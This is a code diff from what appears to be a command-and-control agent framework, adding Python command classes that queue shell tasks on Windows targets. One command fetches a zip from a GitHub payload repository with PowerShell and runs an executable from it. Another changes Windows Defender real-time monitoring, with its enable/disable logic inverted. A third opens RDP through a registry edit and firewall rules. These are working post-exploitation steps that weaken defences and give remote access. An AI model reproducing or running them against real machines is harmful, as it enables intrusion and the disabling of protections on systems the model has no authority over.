@@ -496,11 +496,12 @@ class DesktopGoose(BaseCommand):
 
     def __init__(self, command, args_list, agent_id):
         super().__init__(command, args_list, agent_id)
-        self.target_host = args_list[0]
+        # self.target_host = args_list[0]
         self.agent_class = BaseAgent(agent_id)
 
     def run(self):
         try:
+            make_temp = "shell mkdir C:\Temp"
             download_goose = "shell powershell -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/ryanq47/DakotaConquestPayloads/archive/refs/heads/main.zip' -OutFile 'C:\Temp\\archive.zip'; Expand-Archive -Path 'C:\Temp\\archive.zip' -DestinationPath 'C:\Temp'; rm C:\Temp\\archive.zip; mv C:\Temp\DakotaConquestPayloads-main C:\Temp\somefolder\""
             remove_1 = "shell powershell -c 'rm C:\Temp\somefolder\Linux -r'"
             remove_2 = "shell powershell -c 'rm C:\Temp\somefolder\Python -r'"
@@ -509,6 +510,7 @@ class DesktopGoose(BaseCommand):
             run_goose = "shell C:\Temp\somefolder\goose\GooseDesktop.exe"
 
             # Enqueue the command to create the task
+            self.agent_class.enqueue_command(make_temp)
             self.agent_class.enqueue_command("execution_mode sync")
             self.agent_class.enqueue_command(download_goose)
             self.agent_class.enqueue_command("execution_mode async")
@@ -519,3 +521,60 @@ class DesktopGoose(BaseCommand):
 
         except Exception as e:
             print("ScheduledTaskPingPersistence encountered an error:", e)
+
+
+######################################
+# 10. Defender
+######################################
+class Defender(BaseCommand):
+    command_name = "defender"
+    command_help = (
+        "\tUsage: `defender <arg>`\n"
+        "\tModify defender, valid args are: `enable`, `disable`\n"
+    )
+
+    def __init__(self, command, args_list, agent_id):
+        super().__init__(command, args_list, agent_id)
+        self.defender_on_off_arg = args_list[0]
+        self.agent_class = BaseAgent(agent_id)
+
+    def run(self):
+        try:
+            if self.defender_on_off_arg == "enable":
+                enable_command = 'shell powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true'
+                self.agent_class.enqueue_command(enable_command)
+
+            elif self.defender_on_off_arg == "disable":
+                disable_command = 'shell powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $false'
+                self.agent_class.enqueue_command(disable_command)
+
+        except Exception as e:
+            print("Defender encountered an error:", e)
+
+
+######################################
+# 10. RDP - On/Off
+######################################
+class RDP(BaseCommand):
+    command_name = "rdp"
+    command_help = (
+        "\tUsage: `rdp <arg>`\n" "\tModify rdp, valid args are: `enable`, `disable`\n"
+    )
+
+    def __init__(self, command, args_list, agent_id):
+        super().__init__(command, args_list, agent_id)
+        self.defender_on_off_arg = args_list[0]
+        self.agent_class = BaseAgent(agent_id)
+
+    def run(self):
+        try:
+            if self.defender_on_off_arg == "enable":
+                enable_rdp = "shell powershell -Command \"Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0; Enable-NetFirewallRule -DisplayGroup 'Remote Desktop'\""
+                self.agent_class.enqueue_command(enable_rdp)
+
+            elif self.defender_on_off_arg == "disable":
+                disable_rdp = "shell powershell -Command \"Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 1; Disable-NetFirewallRule -DisplayGroup 'Remote Desktop'\""
+                self.agent_class.enqueue_command(disable_rdp)
+
+        except Exception as e:
+            print("RDP encountered an error:", e)
